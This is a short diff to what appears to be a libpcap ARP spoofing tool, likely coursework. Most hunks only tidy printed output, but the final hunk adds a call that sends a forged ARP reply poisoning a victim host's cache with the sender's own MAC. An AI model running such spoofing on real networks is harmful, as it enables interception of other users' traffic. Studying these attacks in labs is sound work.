@@ -83,7 +83,7 @@ EthArpPacket sendArp(pcap_t* handle, int op, Mac eth_dmac, Mac eth_smac, Mac arp
 	packet.arp_.sip_ = htonl(arp_sip);
 	packet.arp_.tip_ = htonl(arp_tip);
 	
-	printf("sending arp target:  %s\n", std::string(arp_tip).c_str());
+	// printf("sending arp target:  %s\n", std::string(arp_tip).c_str());
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle))    ;
@@ -105,6 +105,7 @@ int main(int argc, char* argv[])
     Mac my_mac;
     Ip my_ip;
     if (getMyInfo(argv[1], my_mac, my_ip)) {
+		printf("[Host Info]\n");
         printf("interface: %s\n", argv[1]);
         printf("my MAC: %s\n", std::string(my_mac).c_str());
         printf("my IP: %s\n", std::string(my_ip).c_str());
@@ -129,6 +130,7 @@ int main(int argc, char* argv[])
         Ip target_ip = Ip(argv[i * 2 + 1]);
 		Mac sender_mac;
 		printf("======================\n");
+		printf("[Sender & Target Info]\n");
 		printf("sender ip: %s\n", std::string(sender_ip).c_str());
         printf("target ip: %s\n", std::string(target_ip).c_str());
 
@@ -148,7 +150,6 @@ int main(int argc, char* argv[])
 				break;
 			}
 			
-			printf("%u bytes captured\n", header->caplen);
 			if (header->caplen < sizeof(EthArpPacket))
 				continue;
 
@@ -167,7 +168,9 @@ int main(int argc, char* argv[])
 		}
 		
 		// Send arp spoofing to target
-		
+		printf("======================\n");
+		printf("[Sending Spoof Packet]\n");
+		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
 	}
 	pcap_close(handle);
     return 0;
